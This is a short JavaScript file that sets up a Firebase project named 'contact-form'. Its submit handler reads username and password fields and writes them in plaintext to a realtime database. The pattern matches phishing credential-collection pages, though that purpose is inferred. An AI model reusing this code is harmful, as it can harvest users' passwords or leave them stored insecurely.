const firebaseConfig = {
    apiKey: "AIzaSyAAc6ebYdVY7iczL4vtpLFlhC32DfO5O-0",
    authDomain: "contact-form-5b0d1.firebaseapp.com",
    databaseURL: "https://contact-form-5b0d1-default-rtdb.firebaseio.com",
    projectId: "contact-form-5b0d1",
    storageBucket: "contact-form-5b0d1.appspot.com",
    messagingSenderId: "117353090141",
    appId: "1:117353090141:web:e9ee670b1aa2e852ef51b4"
};


// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var contactFormDB = firebase.database().ref("contactForm");

document.getElementById("contactForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var username = getElementVal("username");
  var password = getElementVal("password");

  saveMessages(username, password);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("contactForm").reset();
}

const saveMessages = (username, password) => {
  var newContactForm = contactFormDB.push();

  newContactForm.set({
    username: username,
    password: password,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
